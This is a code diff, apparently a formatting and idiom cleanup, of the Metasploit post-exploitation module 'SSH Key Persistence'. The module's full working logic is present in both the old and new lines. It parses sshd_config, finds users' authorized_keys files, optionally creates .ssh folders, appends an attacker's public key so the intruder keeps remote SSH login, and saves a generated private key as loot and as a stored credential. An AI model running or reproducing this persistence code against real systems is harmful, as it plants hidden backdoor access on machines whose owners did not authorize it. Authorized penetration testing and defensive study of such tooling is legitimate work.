@@ -1,10 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-#require 'msf/core'
-#require 'msf/core/post/file'
 require 'sshkey'
 
 class MetasploitModule < Msf::Post
@@ -17,57 +15,61 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name'           => 'SSH Key Persistence',
-        'Description'    => %q{
+        'Name' => 'SSH Key Persistence',
+        'Description' => %q{
           This module will add an SSH key to a specified user (or all), to allow
           remote login via SSH at any time.
         },
-        'License'        => MSF_LICENSE,
-        'Author'         =>
-          [
-            'h00die <mike@shorebreaksecurity.com>'
-          ],
-        'Platform'       => [ 'linux' ],
-        'SessionTypes'   => [ 'meterpreter', 'shell' ],
-        'Targets'        =>
-          [
-            [ 'Automatic', {} ]
-          ],
-        'DefaultTarget'  => 0
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'h00die <mike@shorebreaksecurity.com>'
+        ],
+        'Platform' => [ 'linux' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [ARTIFACTS_ON_DISK]
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_separator
+            ]
+          }
+        }
       )
     )
 
-    register_options(
-      [
-        OptString.new('USERNAME', [false, 'User to add SSH key to (Default: all users on box)' ]),
-        OptPath.new('PUBKEY', [false, 'Public Key File to use. (Default: Create a new one)' ]),
-        OptString.new('SSHD_CONFIG', [true, 'sshd_config file', '/etc/ssh/sshd_config' ]),
-        OptBool.new('CREATESSHFOLDER', [true, 'If no .ssh folder is found, create it for a user', false ])
-      ], self.class
-    )
+    register_options([
+      OptString.new('USERNAME', [false, 'User to add SSH key to (Default: all users on box)' ]),
+      OptPath.new('PUBKEY', [false, 'Public Key File to use. (Default: Create a new one)' ]),
+      OptString.new('SSHD_CONFIG', [true, 'sshd_config file', '/etc/ssh/sshd_config' ]),
+      OptBool.new('CREATESSHFOLDER', [true, 'If no .ssh folder is found, create it for a user', false ])
+    ])
   end
 
   def run
-    if session.type == "meterpreter"
+    if session.type == 'meterpreter'
       sep = session.fs.file.separator
     else
       # Guess, but it's probably right
-      sep = "/"
+      sep = '/'
     end
     print_status('Checking SSH Permissions')
     sshd_config = read_file(datastore['SSHD_CONFIG'])
-    /^PubkeyAuthentication[\s]+(?<pub_key>yes|no)/ =~ sshd_config
+    /^PubkeyAuthentication\s+(?<pub_key>yes|no)/ =~ sshd_config
     if pub_key && pub_key == 'no'
       print_error('Pubkey Authentication disabled')
     elsif pub_key
       vprint_good("Pubkey set to #{pub_key}")
     end
-    /^AuthorizedKeysFile[\s]+(?<auth_key_file>[\w%\/\.]+)/ =~ sshd_config
+    %r{^AuthorizedKeysFile\s+(?<auth_key_file>[\w%/.]+)} =~ sshd_config
     if auth_key_file
       auth_key_file = auth_key_file.gsub('%h', '')
       auth_key_file = auth_key_file.gsub('%%', '%')
       if auth_key_file.start_with? '/'
-        auth_key_file = auth_key_file[1..-1]
+        auth_key_file = auth_key_file[1..]
       end
     else
       auth_key_file = '.ssh/authorized_keys'
@@ -110,7 +112,7 @@ class MetasploitModule < Msf::Post
     if datastore['PUBKEY'].nil?
       key = SSHKey.generate
       our_pub_key = key.ssh_public_key
-      loot_path = store_loot("id_rsa", "text/plain", session, key.private_key, "ssh_id_rsa", "OpenSSH Private Key File")
+      loot_path = store_loot('id_rsa', 'text/plain', session, key.private_key, 'ssh_id_rsa', 'OpenSSH Private Key File')
       print_good("Storing new private key as #{loot_path}")
     else
       our_pub_key = ::File.read(datastore['PUBKEY'])
@@ -120,23 +122,23 @@ class MetasploitModule < Msf::Post
       authorized_keys = "#{path}/#{auth_key_file}"
       print_status("Adding key to #{authorized_keys}")
       append_file(authorized_keys, "\n#{our_pub_key}")
-      print_good("Key Added")
-      if datastore['PUBKEY'].nil?
-        path_array = path.split(sep)
-        path_array.pop
-        user = path_array.pop
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: refname,
-          private_type: :ssh_key,
-          private_data: key.private_key.to_s,
-          username: user,
-          workspace_id: myworkspace_id
-        }
+      print_good('Key Added')
+      next unless datastore['PUBKEY'].nil?
 
-        create_credential(credential_data)
-      end
+      path_array = path.split(sep)
+      path_array.pop
+      user = path_array.pop
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: refname,
+        private_type: :ssh_key,
+        private_data: key.private_key.to_s,
+        username: user,
+        workspace_id: myworkspace_id
+      }
+
+      create_credential(credential_data)
     end
   end
 end
